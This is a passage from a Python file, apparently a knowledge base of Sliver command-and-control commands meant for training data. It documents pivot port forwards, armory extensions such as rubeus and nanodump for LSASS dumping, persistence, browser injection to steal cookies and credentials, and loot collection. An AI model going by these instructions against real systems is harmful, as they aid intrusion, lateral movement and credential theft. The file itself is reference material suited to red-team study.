        "category": "pivot",
        "description": "Create reverse port forwards",
        "syntax": "rportfwd add [--bind <addr>] --remote <host:port>",
        "examples": [
            "rportfwd add --bind 0.0.0.0:8080 --remote 127.0.0.1:80",
            "rportfwd",
            "rportfwd rm --id 1",
        ],
        "explanation": """Create reverse port forwards - expose a local service through the target.

**Add reverse forward:**
```
rportfwd add --bind <target-addr:port> --remote <your-addr:port>
```

**Example - Expose local web server:**
```
rportfwd add --bind 0.0.0.0:8080 --remote 127.0.0.1:80
```
This makes YOUR port 80 accessible on the TARGET's port 8080.

**List forwards:**
```
rportfwd
```

**Remove:**
```
rportfwd rm --id <id>
```

Useful for:
- Serving payloads from your machine through the target
- Providing services to internal network through pivot""",
    },
    "wg-portfwd": {
        "category": "pivot",
        "description": "Create WireGuard-based port forward",
        "syntax": "wg-portfwd add --bind <addr> --remote <addr>",
        "examples": [
            "wg-portfwd add --bind 127.0.0.1:22 --remote 10.10.10.5:22",
        ],
        "explanation": """Create port forwards through WireGuard tunnel.

Similar to portfwd but uses the WireGuard transport, which can be faster and more reliable for some scenarios.

**Add forward:**
```
wg-portfwd add --bind <local> --remote <target>
```

Requires the implant to be connected via WireGuard C2.""",
    },
}

# =============================================================================
# ARMORY & EXTENSIONS
# =============================================================================

ARMORY_COMMANDS = {
    "armory": {
        "category": "armory",
        "description": "Manage Sliver extensions (BOFs, assemblies, aliases)",
        "syntax": "armory [install|update|search] [package-name]",
        "examples": [
            "armory",
            "armory search",
            "armory search kerberos",
            "armory install rubeus",
            "armory install sharpup",
            "armory install situational-awareness",
            "armory update",
        ],
        "explanation": """The Armory is Sliver's extension system, providing additional capabilities.

**List installed extensions:**
```
armory
```

**Search available packages:**
```
armory search
armory search mimikatz
```

**Install extension:**
```
armory install rubeus
armory install seatbelt
armory install sharpup
```

**Update all extensions:**
```
armory update
```

**Extension types:**
- **BOFs (Beacon Object Files)**: In-memory execution, Cobalt Strike compatible
- **Assemblies**: .NET assemblies for execute-assembly
- **Aliases**: Custom command shortcuts

**Popular packages:**
- `rubeus` - Kerberos attacks
- `seatbelt` - System enumeration
- `sharpup` - Privilege escalation checks
- `situational-awareness` - Collection of recon BOFs
- `nanodump` - LSASS dumping""",
    },
    "aliases": {
        "category": "armory",
        "description": "List available command aliases",
        "syntax": "aliases [--load <path>]",
        "examples": [
            "aliases",
            "aliases --load /path/to/alias.json",
        ],
        "explanation": """Aliases are custom commands that wrap complex operations.

**List aliases:**
```
aliases
```

**Load custom alias:**
```
aliases --load ./my-alias.json
```

Aliases are defined in JSON and can:
- Wrap execute-assembly calls
- Provide shortcuts for common tasks
- Standardize tool usage across operators""",
    },
    "extensions": {
        "category": "armory",
        "description": "List loaded extensions",
        "syntax": "extensions [--load <path>]",
        "examples": [
            "extensions",
            "extensions --load ./custom-ext",
        ],
        "explanation": """List and manage Sliver extensions.

**List extensions:**
```
extensions
```

**Load custom extension:**
```
extensions --load ./my-extension
```

Extensions can add entirely new commands to Sliver.""",
    },
}

# =============================================================================
# PERSISTENCE
# =============================================================================

PERSISTENCE_COMMANDS = {
    "persistence": {
        "category": "persistence",
        "description": "Manage persistence mechanisms",
        "syntax": "persistence [--list] [--rm <name>]",
        "examples": [
            "persistence",
            "persistence --list",
        ],
        "explanation": """Manage persistence mechanisms installed by the implant.

**List persistence:**
```
persistence
persistence --list
```

**Remove persistence:**
```
persistence --rm <name>
```

Note: Specific persistence methods are provided by extensions.
Use armory to install persistence-related extensions.""",
    },
}

# =============================================================================
# EVASION
# =============================================================================

EVASION_COMMANDS = {
    "cursed": {
        "category": "evasion",
        "description": "Chrome/Edge process injection and debugging",
        "syntax": "cursed [chrome|edge] [--restore] [--exe <path>]",
        "examples": [
            "cursed chrome",
            "cursed edge",
            "cursed --restore",
        ],
        "explanation": """Inject into Chrome/Edge processes or enable remote debugging for credential theft.

**Enable Chrome debugging:**
```
cursed chrome
```

**Enable Edge debugging:**
```
cursed edge
```

**Restore browser to normal:**
```
cursed --restore
```

With debugging enabled, you can:
- Dump cookies and session tokens
- Capture credentials from browser
- Monitor browsing activity

Note: Requires killing and restarting the browser process.""",
    },
}

# =============================================================================
# INFORMATION GATHERING
# =============================================================================

INFO_COMMANDS = {
    "screenshot": {
        "category": "info",
        "description": "Take a screenshot",
        "syntax": "screenshot [--loot-name <name>]",
        "examples": [
            "screenshot",
            "screenshot --loot-name desktop-capture",
        ],
        "explanation": """Capture a screenshot of the target's display.

**Basic screenshot:**
```
screenshot
```

**Save to loot with name:**
```
screenshot --loot-name initial-access
```

Screenshots are saved to the loot system and can be viewed with `loot` command.

Note: On multi-monitor systems, captures the primary display.""",
    },
    "env": {
        "category": "info",
        "description": "List environment variables",
        "syntax": "env",
        "examples": [
            "env",
        ],
        "explanation": """Display environment variables from the target.

**Syntax:**
```
env
```

Shows all environment variables including:
- PATH
- User directories (HOME, USERPROFILE)
- System paths
- Application-specific variables

Useful for understanding:
- Installed software
- User context
- Potential credential storage locations""",
    },
    "getuid": {
        "category": "info",
        "description": "Get current user ID",
        "syntax": "getuid",
        "examples": [
            "getuid",
        ],
        "explanation": """Display the current user context.

**Syntax:**
```
getuid
```

**Windows output:**
```
DOMAIN\\username
```

**Linux output:**
```
uid=1000(user) gid=1000(user) groups=...
```

Use this to verify your privilege level.""",
    },
    "getgid": {
        "category": "info",
        "description": "Get current group ID",
        "syntax": "getgid",
        "examples": [
            "getgid",
        ],
        "explanation": """Display the current group context (Linux/macOS).

**Syntax:**
```
getgid
```

Shows primary and supplementary group memberships.""",
    },
    "getpid": {
        "category": "info",
        "description": "Get current process ID",
        "syntax": "getpid",
        "examples": [
            "getpid",
        ],
        "explanation": """Display the implant's process ID.

**Syntax:**
```
getpid
```

Useful for:
- Identifying your process in `ps` output
- Avoiding self-termination
- Migration planning""",
    },
    "whoami": {
        "category": "info",
        "description": "Display current user and privileges",
        "syntax": "whoami",
        "examples": [
            "whoami",
        ],
        "explanation": """Display detailed information about the current user context.

**Syntax:**
```
whoami
```

Shows:
- Username and domain
- User SID (Windows)
- Group memberships
- Privileges

More detailed than `getuid` - shows all security context information.""",
    },
    "loot": {
        "category": "info",
        "description": "Manage collected loot",
        "syntax": "loot [--type <type>] [--save <id> <path>]",
        "examples": [
            "loot",
            "loot --type file",
            "loot --type credential",
            "loot --save 1 ./credentials.txt",
        ],
        "explanation": """View and manage collected loot (files, credentials, screenshots).

**List all loot:**
```
loot
```

**Filter by type:**
```
loot --type file
loot --type credential
loot --type screenshot
```

**Save loot to file:**
```
loot --save <id> ./output/
```

**Remove loot:**
```
loot --rm <id>
```

Loot is automatically populated when:
- Using `download`
- Using `screenshot`
- Credential extraction commands run""",
    },
}

# =============================================================================
# AGGREGATE ALL COMMANDS
# =============================================================================

SLIVER_COMMANDS = {
    **LISTENER_COMMANDS,
    **IMPLANT_COMMANDS,
    **SESSION_COMMANDS,
    **POST_EXPLOITATION_COMMANDS,
    **PROCESS_COMMANDS,
    **NETWORK_COMMANDS,
    **CREDENTIAL_COMMANDS,
    **PIVOT_COMMANDS,
    **ARMORY_COMMANDS,
    **PERSISTENCE_COMMANDS,
    **EVASION_COMMANDS,
    **INFO_COMMANDS,
}

# Command categories for balanced training data
COMMAND_CATEGORIES = {
    "listener": ["mtls", "http", "https", "dns", "wg", "jobs"],
    "implant": ["generate", "regenerate", "implants", "profiles", "stage-listener"],
    "session": ["sessions", "beacons", "use", "background", "kill", "info"],
    "post": ["execute", "shell", "powershell"],
    "file": ["upload", "download", "cat", "cd", "pwd", "ls", "mkdir", "rm", "mv", "cp", "chmod", "chown"],
    "process": ["ps", "procdump", "terminate", "migrate", "execute-assembly", "sideload", "spawndll", "msf"],
    "network": ["ifconfig", "netstat", "arp"],
    "credential": ["hashdump", "dcsync"],
    "pivot": ["pivots", "portfwd", "socks5", "rportfwd", "wg-portfwd"],
    "armory": ["armory", "aliases", "extensions"],
    "persistence": ["persistence"],
    "evasion": ["cursed"],
    "info": ["screenshot", "env", "getuid", "getgid", "getpid", "whoami", "loot"],
}


def get_commands_by_category(category: str) -> dict:
    """Get all commands in a specific category."""
    return {k: v for k, v in SLIVER_COMMANDS.items() if v["category"] == category}


def get_all_commands() -> dict:
    """Get all commands."""
    return SLIVER_COMMANDS


def get_command_count() -> int:
    """Get total number of documented commands."""
    return len(SLIVER_COMMANDS)


if __name__ == "__main__":
    print(f"Sliver Knowledge Base")
    print(f"=====================")
    print(f"Total commands documented: {get_command_count()}")
    print()
    for category, commands in COMMAND_CATEGORIES.items():
        print(f"  {category}: {len(commands)} commands")
